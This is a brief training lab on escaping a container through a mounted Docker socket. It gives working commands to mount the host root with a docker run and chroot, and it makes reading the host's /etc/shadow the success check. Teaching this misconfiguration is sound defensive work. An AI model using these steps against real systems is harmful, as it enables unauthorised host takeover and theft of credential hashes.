# Lab 1: The Docker Socket Escape

## Goal: Escape a container to take over the host.

## Scenario:
You have a shell inside a container, and you notice the Docker socket is mounted.

## Steps:
1. **Check for the socket**: `ls -l /var/run/docker.sock`
2. **Install Docker CLI**: (If not present, download a static binary).
3. **Launch a Privileged Container**:
   `docker run -v /:/host -it alpine chroot /host`
4. **Victory**: You are now root on the host machine's filesystem.

## Success Check:
- [ ] Successfully accessed the host's `/etc/shadow` file from inside a container.
- [ ] Understand why mounting the Docker socket is a critical security flaw.
